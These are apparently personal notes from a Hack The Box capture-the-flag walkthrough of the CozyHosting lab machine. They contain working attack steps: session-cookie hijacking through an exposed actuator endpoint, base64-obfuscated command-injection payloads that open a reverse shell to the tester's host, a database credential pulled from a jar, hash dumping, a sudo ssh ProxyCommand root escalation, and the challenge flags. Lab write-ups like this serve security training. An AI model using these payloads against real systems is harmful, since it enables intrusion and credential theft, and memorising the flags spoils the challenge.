hackthebox
target : 10.10.11.230
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

using dirsearch I fiound this http://cozyhosting.htb/actuator/sessions
i think these are cookies.
8C2A2B3E835A63E2812421D41AA8DDC8	"kanderson"
B6E77670D2FB4FAA99AE4D163A9CC622	"kanderson"

{"CFE72ADC845C2E96EFE77B129F52DC97":"UNAUTHORIZED","B6E77670D2FB4FAA99AE4D163A9CC622":"kanderson","2FDA6607716D1C652AB2A48BBACAF8F1":"kanderson"}
fireup burpsuite and intercept login page and now change the sessiosn and usernane 



# Bash B64 Ofuscated
{echo,COMMAND_BASE64}|{base64,-d}|bash 
echo${IFS}COMMAND_BASE64|base64${IFS}-d|bash
bash -c {echo,COMMAND_BASE64}|{base64,-d}|{bash,-i} 
echo COMMAND_BASE64 | base64 -d | bash 
┌──(root㉿kali)-[/home/kali/Desktop/HackNote]
└─# echo "sh -i >& /dev/tcp/10.10.15.62/1337 0>&1" | base64 
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuNjIvMTMzNyAwPiYxCg==

echo${IFS} c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuNjIvMTMzNyAwPiYxCg==| base64${IFS} -d | bash
in Burp : 
host=10.10.15.62&username=;echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuNjIvMTMzNyAwPiYxCg"|base64${IFS}-d|bash;

I found this file : cloudhosting-0.0.1.jar
now i will download it on my machine and read it
found also user josh on home page : 
I used this command 
find . -type f -exec grep -a -i -n "password=" {} \; -print to get all where is password
I got ./BOOT-INF/classes/htb/cloudhosting/database/CozyUser.class
7:--data-ra,(username=kanderson&password=MRdEQuv6~6P.-v
./BOOT-INF/classes/htb/cloudhosting/scheduled/FakeUser.class

In the applications properties >
$ cat ./BOOT-INF/classes/application.properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR$

find . -type f -exec grep -a -i -n "spring.datasource" {} \; -print

[]_$ find . -type f -exec grep -a -i -n "spring.datasource" {} \;
5:spring.datasource.driver-class-name=org.postgresql.Driver
9:spring.datasource.platform=postgres
10:spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
11:spring.datasource.username=postgres
12:spring.datasource.password=Vg&nvzAQ7XxR


Connected to the db
psql "postgresql://postgres:Vg&nvzAQ7XxR@localhost/postgres
Now i need to extract databases; in this 
using \c cozyhosting 
cozyhosting=# SELECT * FROM users;
WARNING: terminal is not fully functional
Press RETURN to continue 
   name    |                           password                           | role
  
-----------+--------------------------------------------------------------+-----
--
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admi

 cracked manchesterunited for first user
 connected using user josh that if found first 
 josh@cozyhosting:~$ cat user.txt 
addce1643df8c78b655d10992dd5fb3a

for root:
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# id
uid=0(root) gid=0(root) groups=0(root)
# ls /root
root.txt
# cat /root/root.txt
89582bc074bf16f9c9d80843ed85e177
